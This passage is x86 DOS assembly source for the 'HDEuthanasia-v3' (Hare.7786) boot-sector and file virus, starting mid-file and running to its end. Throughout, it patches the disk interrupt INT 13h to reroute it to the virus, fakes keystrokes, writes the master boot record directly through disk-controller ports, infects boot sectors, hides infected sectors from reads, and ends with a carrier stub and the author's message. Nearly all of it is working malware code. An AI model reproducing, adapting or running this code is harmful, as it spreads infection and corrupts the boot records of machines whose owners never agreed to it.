		MOV     CS:Traced_Int13h+2, AX
                AND     CS:Ermm, 0FCh

		CALL    Slice_Int13h
		CALL    Insert_Slice

LOC_RET_224:
		RETN



Traced_i13h:
		PUSHF
		CALL    DWORD PTR CS:Traced_Int13h

		RETN


NewInt16h:
                CMP     AH, 01h                 ; Read keyboard-status?
                JA      JMP_Int16h

                CMP     AH, 01h                 ; Read keyboard-status?
		JE      LOC_225

		CALL    Infect_Exec1
                CALL    OldInt16h               ; Execute function.
                CALL    Get_Proceed_Char

		MOV     BYTE PTR CS:Dum2, 02h

                RETF    2                       ; Return to caller.

LOC_225:
		DEC     BYTE PTR CS:[18EDH]
                JNZ     JMP_Int16h

		MOV     BYTE PTR CS:[18EDH], 5

		PUSH    AX
		PUSH    CX

                CALL    Get_Proceed_Char
		MOV     CX, AX
		MOV     AH, 05h
                INT     16h                   ; Keyboard i/o  ah=function 05h
                                              ; stuff key cx into keybd buffr
		POP     CX
		POP     AX
		CALL    OldInt16h

                RETF    2                       ; Return far.

JMP_Int16h:
                DB      0EAh                    ; JMP to original handler.
Int16h          DW      0, 0

Dum3            DB      04h
Dum1            DW      0
Dum2            DB      02h

OldInt16h:
		PUSHF
		CALL    DWORD PTR CS:Int16h

		RETN


Proceed_Key     DW      1559h           ; Y
                DW      314Eh           ; N
                DW      314Eh           ; N
                DW      314Eh           ; N
                DW      1559h           ; Y
                DW      1559h           ; Y
                DW      314Eh           ; N
                DW      1559h           ; Y


Get_Proceed_Char:

		PUSH    DI

		MOV     DI, CS:Dum1
		MOV     AL, CS:Dum2
                CBW
		ADD     DI, AX
                MOV     AX, CS:Proceed_Key[DI]

		POP     DI

		RETN



Infect_Exec1:
		PUSH    AX
		PUSH    CX

		MOV     AH, 01h                 ; Read keyboard-status.
		CALL    OldInt16h
		JZ      LOC_227

		XCHG    CX, AX
                CALL    Get_Proceed_Char

		CMP     AX, CX
		JE      LOC_228

		PUSH    DS

		XOR     AX, AX
		MOV     DS, AX

		MOV     AX, DS:[41Ah]           ; Address BASIC errorhandler.
		MOV     DS:[41Ch], AX           ; Mink (?).

		POP     DS

LOC_227:        CALL    Get_Proceed_Char
                MOV     CX, AX                  ; Write to keyboard-buffer.
		MOV     AH, 05h
                INT     16h

LOC_228:        POP     CX
		POP     AX

		RETN



Infect_Exec2:

PARAMETER_1     =       4                       ; BP+4
PARAMETER_2     =       6                       ; BP+6
PARAMETER_3     =       8                       ; BP+8
PARAMETER_4     =       0AH                     ; BP+0AH

		PUSH    BP
		MOV     BP, SP

                MOV     Trace_Function, 0       ; Function: Reset disk.
		MOV     First_MCB, 71h
                MOV     Fake_PUSHF, 00h
		MOV     Trace_Done, 01h

		MOV     AX, 3513h               ; Get INT 13h.
		INT     21h

		MOV     Trace_Int, BX
		MOV     Trace_Int+2, ES
		CALL    Tracer

		CLD                             ; Replace INT 13h address
		MOV     SI, OFFSET Trace_Int    ; with traced address.
		MOV     DI, OFFSET Traced_Int13h
		MOVSW
		MOVSW

		MOV     AX, 440Dh
		MOV     BX, 180h
		MOV     CX, 84Bh
                INT     21h                   ; DOS Services  ah=function 44h
                                              ; IOctl-D block device control
                                              ; bl=drive, cx=category/type
                                              ; ds:dx ptr to parameter block

		MOV     AX, 3516h               ; Get INT 16h.
		INT     21h

		MOV     Int16h, BX              ; Save address INT 16h.
		MOV     Int16h+2, ES

		MOV     Dum3, 05h
                MOV     Dum1, 0
		MOV     DX, OFFSET NewInt16h
		MOV     AX, 2516h               ; Hook INT 16h (keyboard).
		INT     21h

		PUSH    CS
		POP     ES

		MOV     BX, [BP+PARAMETER_3]
		MOV     CX, [BP+PARAMETER_2]
		MOV     DX, [BP+PARAMETER_1]

LOC_229:        MOV     AX, [BP+PARAMETER_4]
		CALL    Traced_i13h
		JNC     LOC_230

		MOV     AX, Dum1
		ADD     AL, 04h
		MOV     Dum1, AX
		MOV     Dum2, 00h

		CMP     AL, 0Ch
		JBE     LOC_229

		STC

LOC_230:        PUSHF
		PUSH    DS
		LDS     DX, DWORD PTR Int16h
		MOV     AX, 2516h               ; Restore original INT 16h.
		INT     21h

		POP     DS
		POPF
		POP     BP

		RETN    8

;fuck
Write_Boot:
                CALL    CMOS_Harddisk
                JC      LOC_232                 ; Abort when no harddisk.

                JMP     Port_Infect

LOC_231:        POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

LOC_232:        CALL    Traced_i13h
		JMP     LOC_RET_236

Port_Infect:
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES

                MOV     DI, 04h
LOC_234:        MOV     SI, BX                  ; SI = Offset bootsector.

		DEC     DI
		JZ      LOC_231

		MOV     AH, 00h                 ; Reset 1st harddisk.
                MOV     DL, 80h                 ; *** Better use call 0Dh.
		INT     13h

		XOR     AX, AX
		MOV     ES, AX

		MOV     ES:48Eh, AL

		CLD
		MOV     DX, 3F6h
                MOV     AL, 04h
                OUT     DX, AL                  ; Reset controller.

                JMP     $+2                     ; Delay for I/O.
                JMP     $+2

                MOV     AL, 00h
                OUT     DX, AL                  ; al = 0, hdsk0 register
                CALL    Wait_Ready

                MOV     DX, 1F2h                ; Sector count.
                MOV     AL, 01h                 ; 1 sector.
                OUT     DX, AL

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 01h                 ; Sector: MBR.
                OUT     DX, AL

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 0
                OUT     DX, AL                  ; Cylinder lo.

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 0
                OUT     DX, AL                  ; Cylinder hi.

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 10100000b
                OUT     DX, AL                  ; 1st harddisk, head zero.

                JMP     $+2                     ; Delay for I/O.
                JMP     $+2

		INC     DX
		MOV     AL, 31h
                OUT     DX, AL                  ; Write sectors without retry.
                CALL    Wait_Servicing

                MOV     CX, (512 / 2)
                MOV     DX, 1F0h                ; Data-register.
                DB      0F3h, 6Fh               ; REP OUTSW, (286+).

LOC_235:        MOV     AL, ES:48Eh             ; Timer (?).

		OR      AL, AL
		JZ      LOC_235

                CALL    Wait_Ready

                TEST    AL, 00100001b           ; Write fault?
		JNZ     LOC_234

		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

LOC_RET_236:    RETN


Wait_Ready:
		MOV     DX, 1F7h
Not_Ready:      IN      AL, DX                  ; Get status-register.

                TEST    AL, 10000000b           ; Controller executing
                JNZ     Not_Ready               ; command?

		RETN



Wait_Servicing:
                CALL    Wait_Ready

                TEST    AL, 00001000b           ; Disk buffer requires
                JZ      Wait_Servicing          ; servicing?

		RETN


; Returns CF if no harddrive present.
CMOS_Harddisk:
		PUSH    AX
		PUSH    BX

		MOV     AX, SP

		PUSH    SP
		POP     BX

		STC
		PUSHF

		CMP     AX, BX
		JNE     LOC_239

                MOV     AL, 12h                 ; 7C00h + stuff, loading from
                CALL    Infect_Exec7            ; boot?

		POPF
		CLC
		PUSHF

		AND     AH, 11110000b

		CMP     AH, 00010000b
		JA      LOC_239

		POPF
		STC
		PUSHF

LOC_239:        POPF
		POP     BX
		POP     AX

		RETN

; Returns: AH = harddisk-type.
Infect_Exec7:
		PUSH    BX
		MOV     BL, AL

                OR      AL, 10000000b           ; AL = 92h.
		CLI
		OUT     70h, AL                 ; Port 70h, CMOS addr,bit7=NMI
						; AL = 92h, hard disk type.

                JMP     $+2                     ; Delay for I/O.
                JMP     $+2

                IN      AL, 71h                 ; Read byte from CMOS.
		MOV     AH, AL
		XOR     AL, AL

                JMP     $+2                     ; CMOS is sloooooow!
                JMP     $+2

                OUT     70h, AL                 ; Request read CMOS-seconds.

		STI

		MOV     AL, BL
		POP     BX

		RETN

Entry_Bytes     DB      5 DUP(0)        ; Original first 5 bytes of INT 13h
					; entrypoint which are overwritten
					; with a JMP FAR to our handler.
;
; Copies the first five bytes of INT 13h to a temp variable.
;
Slice_Int13h:
		PUSH    CS
		POP     ES

		MOV     DI, OFFSET Entry_Bytes
		LDS     SI, DWORD PTR ES:Traced_Int13h

		CLD
		MOVSW
		MOVSW
		MOVSB

		RETN


;
; Overwrites the entrypoint of INT 13h with a JMP FAR to our INT 13h handler.
;
;
Insert_Slice:
		PUSH    DS
		PUSH    SI
		PUSH    AX
		PUSHF

                TEST    CS:Ermm, 00000010b      ; Init INT 13h ?
		JNZ     LOC_240

		LDS     SI, DWORD PTR CS:Traced_Int13h

		; Overwrite with JMP FAR [viruscode].

		MOV     BYTE PTR [SI], 0EAh
		MOV     WORD PTR [SI+1], OFFSET NewInt13h
		MOV     WORD PTR [SI+3], CS

LOC_240:        POPF
		POP     AX
		POP     SI
		POP     DS

		RETN


Unslice_Int13h:

		PUSHF
		PUSH    CX
		PUSH    DI
		PUSH    SI
		PUSH    DS
		PUSH    ES

		PUSH    CS
		POP     DS

                TEST    Ermm, 00000010b         ; INT 13h hooked already?
		JNZ     LOC_241

		CLI
		MOV     SI, OFFSET Entry_Bytes
		LES     DI, DWORD PTR Traced_Int13h

		CLD                             ; Copy 
		MOV     CX, 5
		REP     MOVSB

LOC_241:        STI
		POP     ES
		POP     DS
		POP     SI
		POP     DI
		POP     CX
		POPF

		RETN

Int13h          DW      0, 0
Hiding_TS       DW      0BDBFh
Dos_Mem         DW      0
DATA_152        DB      0
Function_i13h   DB      0
Temp_Storage    DB      0
		DB      0

Exec_Int13h:
		POPF

		MOV     CS:Function_i13h, AH         ; Save function #.
		CALL    Traced_i13h

		PUSHF

		OR      AH, AH
		JZ      LOC_243

		JMP     LOC_255
LOC_243:
		MOV     CS:Function_i13h,0
		POPF
		CALL    Insert_Slice
		RETF    2

NewInt13h:
                PUSHF                           ; I wish all TSR-handlers
                                                ; where using this!

                CMP     AX, Res_Check_i13h      ; Residency-check?
		JNE     Check_Next_2

                MOV     AX, Marker_Mem_i13h     ; Our sign.

		POPF

                RETF    2                       ; Return to caller.

Check_Next_2:
		CALL    Unslice_Int13h

		CMP     DX, 80h                 ; Head zero of 1st harddisk?
                JNE     No_Condition

		CMP     CX, 01h                 ; MBR?
                JNE     No_Condition

		CMP     AH, 03h                 ; Doing a write?
                JA      No_Condition

		CMP     AH, 02h                 ; Doing a read?
                JB      No_Condition

		POPF

                JMP     Check_Inf_Boot
		NOP
No_Condition:
		CMP     DL, 80h
                JNB     Check_Hiding

                CMP     AH, 16h                 ; Read disk change line stat.
                JNE     LOC_246

		JMP     Exec_Int13h
LOC_246:
		CMP     AH, 05h
                JAE     Check_Hiding

		CMP     AH, 01h
                JBE     Check_Hiding

		JMP     LOC_255
Check_Hiding:
                CMP     DL, 80h                 ; Only on 1st harddisk.
                JNE     Exit_Int13h

                CMP     CS:Hiding_TS, CX
                JNE     Exit_Int13h

		AND     CH, 02h

Exit_Int13h:    POPF

		CALL    Traced_i13h
                CALL    Insert_Slice            ; Swap bytz back.

		RETF    2

; Infect harddisk.
Check_Inf_Boot:
                PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES

                CMP     AH, 02h                 ; Read bootsector/MBR ?
                JE      Do_Read

		JMP     LOC_251

Do_Read:        CALL    Traced_i13h               ; Execute function.

		PUSHF
		PUSH    AX
		PUSH    BX

		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		CALL    Traced_i13h

		INC     CH
		DEC     DH
		MOV     DL, 80h
		MOV     AX, 0201h               ; Read stored bootsector (?)
		POP     BX
		CALL    Traced_i13h
		POP     AX
		POPF

		JMP     LOC_253

LOC_251:
		PUSH    DS
		PUSH    DI
		PUSH    SI
		PUSH    AX
		DEC     AL
		PUSH    ES
		PUSH    BX

                JZ      LOC_252                 ; Read one sector?

                ADD     BX, 512
		INC     CL
		CALL    Traced_i13h
		DEC     CL

LOC_252:        MOV     AH, 08h
		MOV     DL, 80h
		CALL    Traced_i13h

		POP     BX
		POP     ES

		INC     CH
		DEC     DH
		MOV     DL, 80h
		MOV     AX, 0301h
		CALL    Encrypt_Boot
		CALL    Traced_i13h

                MOV     BX, AX
		POP     AX
                MOV     AL, BL

		POP     SI
		POP     DI
		POP     DS

LOC_253:        POP     ES
		POP     DX
		POP     CX
		POP     BX

		CALL    Insert_Slice

		RETF    2
LOC_254:
		JMP     LOC_260
LOC_255:
                PUSH    AX                      ; Save registers.
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    SI
		PUSH    DI

		XOR     AX, AX
		MOV     DS, AX

		XOR     CH, CH
		MOV     CL, DL
                INC     AL                      ; *** Better use INC AX.
		SHL     AL, CL

		CMP     CS:Function_i13h, 00h
		JNE     LOC_256

                TEST    AL, byte ptr Gaby1
		JNZ     LOC_254

LOC_256:        PUSH    CS
		POP     DS

		PUSH    DS
		POP     ES

		MOV     CL, 4                   ; Multiplied by 16.
		SHL     AL, CL

		MOV     DATA_152, AL
                MOV     SI, 3

LOC_257:        XOR     AX, AX                  ; Reset disk.
		CALL    Traced_i13h

		MOV     AX, 0201h               ; Read bootsector
		MOV     CX, 01h
		MOV     DH, CH
		MOV     BX, OFFSET Buffer
		CALL    Traced_i13h
		JNC     LOC_258

		DEC     SI
		JZ      LOC_254
		JMP     LOC_257
LOC_258:
                MOV     AX, Buffer + 102h
                SUB     AX, DS:[Buffer] + 100h

                CMP     AX, Marker_Boot
		JE      LOC_254

		CALL    SUB_71
		CALL    SUB_72
		JNC     LOC_259

                MOV     AX, 0401h               ; Verify bootsector/MBR.
		XOR     CX, CX
		INC     CX
		MOV     DH, CH
		CALL    Traced_i13h
		JMP     LOC_260
LOC_259:
		XOR     BX, BX
fuxor:
		MOV     CL, 01h
                MOV     AX, 0300h + Body_Sectors
		CALL    Traced_i13h
		JC      LOC_260

		MOV     BX, OFFSET Buffer
		MOV     CL, 11h
		MOV     AX, 0301h
		CALL    Traced_i13h
		JC      LOC_260

		MOV     BL, 02h
		PUSH    DX
		CALL    SUB_49
		POP     DX
		MOV     CX, 01h
		XOR     DH, DH
		MOV     BX, OFFSET Buffer
                MOV     BYTE PTR DS:[Buffer], 0EBh  ; JMP viruscode in MBR.
                MOV     BYTE PTR DS:[Buffer+1], 3Ch ; *** Better use WORD PTR
		MOV     AX, 0301h
		CALL    Traced_i13h
LOC_260:
		POP     DI
		POP     SI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		CMP     CS:Function_i13h, 0
                JZ      LOC_261

		JMP     LOC_243


LOC_261:
                CMP     DH, 00h                 ; Head zero?
		JNE     LOC_262

                CMP     CX, 01h                 ; Bootsector/MBR?
		JNE     LOC_262

		TEST    CS:Flags, 00000100b
		JNZ     LOC_262

                CMP     AH, 02h                 ; Doing a read?
		JE      LOC_263

                CMP     AH, 03h                 ; Doing a write?
		JE      LOC_265

LOC_262:
                JMP     Exit_Int13h
LOC_263:
		POPF

		CALL    Traced_i13h

		PUSHF
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		JC      LOC_264

		MOV     AX, ES:[BX+102h]        ; Subtract 1st word from word.
		SUB     AX, ES:[BX+100h]

                CMP     AX, Marker_Boot         ; Infected bootsector?
		JNE     LOC_264

		MOV     CH, 51h                 ; Cylinder 81.
		MOV     CL, 11h                 ; Sector 17.
		MOV     DH, 01h                 ; 1st head.
		MOV     AX, 0201h               ; Read sector
		CALL    Traced_i13h
LOC_264:
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		CALL    Insert_Slice

		POPF
		RETF    2


LOC_265:
		PUSH    AX
		PUSH    BX
		PUSH    ES

		PUSH    CS
		POP     ES

                MOV     AX, 0201h               ; Read bootsector/MBR.
		MOV     BX, OFFSET Buffer
		CALL    Traced_i13h

		POP     ES
		POP     BX
		POP     AX

		PUSH    AX

		DEC     AL
		JZ      LOC_266

                ADD     BX, 512
		INC     CL
		CALL    Traced_i13h

                SUB     BX, 512
		DEC     CL
LOC_266:
		PUSH    DI
		PUSH    SI
		PUSH    DS
		PUSH    ES
		PUSH    BX

		MOV     AX, ES:[DI+102h]        ; Subtract word from word.
		SUB     AX, ES:[DI+100h]

                CMP     AX, Marker_Boot         ; Infected signature?
		JNE     LOC_267

                MOV     CH, 51h                 ; *** Sheesh!
		MOV     CL, 11h
		MOV     DH, 01h
		MOV     AX, 0301h
		CALL    Traced_i13h

		PUSH    ES
		POP     DS

		PUSH    CS
		POP     ES

                MOV     SI, BX                  ; Copy datablock to buffer.
                ADD     SI, 3
                MOV     DI, OFFSET Buffer + 3
                MOV     CX, 59
		REP     MOVSB

		MOV     BX, OFFSET Buffer
LOC_267:
                MOV     DH, 00h                 ; Write bootsector/MBR.
		MOV     CX, 01h
		MOV     AX, 0301h
		CALL    Traced_i13h

                MOV     CS:Temp_Storage, AH

		POP     BX
		POP     ES
		POP     DS
		POP     SI
		POP     DI
		POP     AX

                MOV     AH, CS:Temp_Storage
		CALL    Insert_Slice
		POPF

		RETF    2


SUB_71:
		MOV     AL, DS:1E7Eh+1

                CMP     AL, 0FDh
		JE      LOC_268

		MOV     CH, 51h
		JMP     LOC_RET_269
LOC_268:
                MOV     CH, 29h

LOC_RET_269:
		RETN

SUB_72:
		MOV     DH, CH
                MOV     Temp_Storage, DL

		XOR     AX, AX
		MOV     ES, AX

		LES     DI, DWORD PTR ES:[1Eh * 4]
		MOV     AX, ES:[DI+3]
		PUSH    AX
		MOV     BYTE PTR ES:[DI+3], 02h
		MOV     BYTE PTR ES:[DI+4], 11h

		PUSH    CS
		POP     ES

                MOV     DI, OFFSET Buffer + 512

		CLD
		MOV     CX, 11h
		MOV     DL, 01h

LOCLOOP_270:    MOV     AH, 01h
		MOV     AL, DH
		STOSW

		MOV     AL, DL
		MOV     AH, 02h
		STOSW

		INC     DL
		LOOP    LOCLOOP_270

                MOV     AX, 50Fh
		MOV     CH, DH
		MOV     CL, 1
		MOV     DH, 1
                MOV     DL, Temp_Storage
                MOV     BX, OFFSET Buffer + 512
		CALL    Traced_i13h
		PUSHF
                MOV     BYTE PTR Verify_Sectors+2, CH

		XOR     AX, AX
		MOV     ES, AX

		LES     DI, ES:[1Eh * 4]
		POPF
		POP     AX
		MOV     ES:[DI+3],AX
		PUSH    CS
		POP     ES
		RETN

LOC_271:
                MOV     BX, 0B50h

		MOV     ES, BX
		XOR     BX, BX

                MOV     AX, 1E0Eh

		PUSH    ES
		PUSH    AX

Verify_Sectors: MOV     CX, 5101h

                MOV     AX, 0411h
                MOV     DX, 0100h
                INT     13h                 ; Disk  dl=drive a  ah=func 04h
                                            ; verify sectors with mem es:bx
                                            ; al=#,ch=cyl,cl=sectr,dh=head
                MOV     AX, 0211h           ; Read virusbody from disk.
		INT     13h
		JC      LOC_271
		RETF

		STI

		XOR     AX, AX
		MOV     ES, AX

		PUSH    CS
		POP     DS

		CLD
		MOV     DI, 7C00h
		MOV     SI, 2000h
		MOV     CX, 512
		PUSH    ES
		PUSH    DI
		REP     MOVSB

		MOV     Flags, AL               ; Clear flags.

		CALL    Check_Poly_Sector
		CALL    Infect_Harddisk

		RETF

Message         DB      '"HDEuthanasia-v3" by Demon Emperor: '
                DB      'Hare Krsna, hare, hare...'

     ; (I sure hope 4U that ya never see this message during boot-up!).

Virus_End:

Buffer          DW      512 DUP(0)

Carrier:
		PUSH    CS
		POP     DS

                MOV     AH, 09h                 ; Display warning-message.
		MOV     DX, OFFSET Warning
		INT     21h

                MOV     AX, 4C00h               ; Exit to DOS.
		INT     21h

Warning         DB      'WARNING: This program is infected with the '
                DB      'HDEuthanasia-v3 (Hare.7786) virus!', 0Ah, 0Dh, '$'

EXE_Header      STRUC
Marker          DW      0       ; .EXE-identifier (always 'MZ').
File_Mod512     DW      0       ; Filesize MOD 512.
Byte_Pages      DW      0       ; Filesize in 512-byte pages (rounded-up).
Num_Reloc       DW      0       ; 
Header_Size     DW      0       ; Headersize in paragraphs.
Min_Mem         DW      0       ; Minimal memory requirements in paragraphs.
Max_Mem         DW      0       ; Maximal memory requirements in paragraphs.
Init_SS         DW      0       ; Program's SS.
Init_SP         DW      0       ; Initial SP.
Checksum        DW      0       ; Checksum, unused by MS-DOS, used by us.
Init_IP         DW      0       ; Initial IP.
Init_CS         DW      0       ; CS.
Reloc_Offs      DW      0       ; Offset in bytes of relocation-table.
Overlay_Number  DW      0       ;
Undocumented    DW      0       ; Undocumented by Micro$oft.
EXE_Header      ENDS

		END     START
